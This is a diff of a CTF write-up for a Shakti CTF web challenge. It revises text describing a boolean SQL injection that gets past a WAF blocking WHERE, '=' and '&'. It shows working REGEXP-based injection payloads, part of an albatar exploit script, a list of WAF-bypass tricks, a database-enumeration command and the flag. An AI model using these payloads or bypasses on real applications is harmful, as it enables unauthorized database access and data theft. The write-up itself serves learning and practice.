@@ -12,7 +12,7 @@ tags: [ctf, Shakti CTF, web]
  * Description: 
  > I'm on the way to open my very own Art Gallery http://34.66.139.33/. I can allow you to take a peak if you want. But not everyone though. Author: Nimisha
 
-Exploiting a boolean SQLi without `WHERE` and the `[ &=]` characters using REGEXP and the [albatar](https://github.com/lanjelot/albatar) framework.
+Exploiting a boolean SQLi without `WHERE` or the characters `&` and `=` using REGEXP and the [albatar](https://github.com/lanjelot/albatar) framework.
 
 <!--more-->
 
@@ -131,11 +131,11 @@ Turns out we actually have a boolean SQLi:
 * `username=test'%2b(select*from(select('a'))a)#&password=` -> "welcome!!"
 * `username=test'%2b(select*from(select('1'))a)#&password=` -> "Incorrect username or password or both??"
 
-But the WAF is slightly annoying and because the `=` and `&` are blacklisted, I went with the REGEXP technique:
+But the WAF is slightly annoying and because `=` and `&` are blacklisted, I went with the REGEXP technique:
 * `username=test'%2b(select*from(select(if(((select/**/'b')regexp/**/binary/**/'^b'),'a','1')))a)#` -> "welcome!!"
 * `username=test'%2b(select*from(select(if(((select/**/'a')regexp/**/binary/**/'^b'),'a','1')))a)#` -> "Incorrect username or password or both??"
 
-I wrote an exploit script using the [albatar](https://github.com/lanjelot/albatar) framework, which I specifically created to exploit intricate SQL injections.
+I wrote an exploit script using [albatar](https://github.com/lanjelot/albatar), a framework I specifically created to exploit intricate SQL injections.
 ```python
 from albatar import *
 
@@ -165,7 +165,6 @@ def mysql_boolean_regexp():
             tamper_payload = bypass_waf
         )
   
-    # PoC: username=test'%2b(select*from(select(if(((select/**/'a')regexp/**/binary/**/'^b'),'a','1')))a)%23&password=
     template = "'+(select*from(select(if(((${query})regexp binary ${regexp}),'a','1')))a)#"
     return Method_regexp(make_requester, template, confirm_char=False)
 
@@ -176,10 +175,10 @@ for r in sqli.exploit():
 ```
 
 Because the WAF blocks the `WHERE` keyword and some special chars like `[ &=]`, we need to:
-* replace all spaces with `/**/`
-* either remove the `=` and `&` chars from our regexp search [pattern](https://github.com/lanjelot/albatar/blob/master/albatar.py#L511) or use [hex-encoding](https://github.com/lanjelot/albatar/blob/master/albatar.py#L522)
-* use the `IN` keyword instead of `=` (although we won't need to)
-* juggle with `count()` and `limit` instead of using `where`
+* replace all spaces with `/**/` or `\x09`
+* either remove `=` and `&` from our regexp search [pattern](https://github.com/lanjelot/albatar/blob/master/albatar.py#L511) or use [hex-encoding](https://github.com/lanjelot/albatar/blob/master/albatar.py#L522)
+* use the `IN` keyword instead of `=` (although we won't even need to)
+* juggle with `COUNT()` and `LIMIT` instead of using `WHERE`
 
 Demo:
 ```console
@@ -221,7 +220,7 @@ Flag was `shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}`.
 
 Just FYI:
 ```
-$ python shakti.py -b --current-db --current-user --hostname --dbs --user
+$ python shakti.py -b --current-user --current-db --hostname --users --dbs
 03:25:41 albatar - Starting Albatar v0.1 (https://github.com/lanjelot/albatar) at 2021-04-05 03:25 AEST
 03:25:41 albatar - Executing: 'SELECT VERSION()'
 5.7.33-0ubuntu0.18.04.1
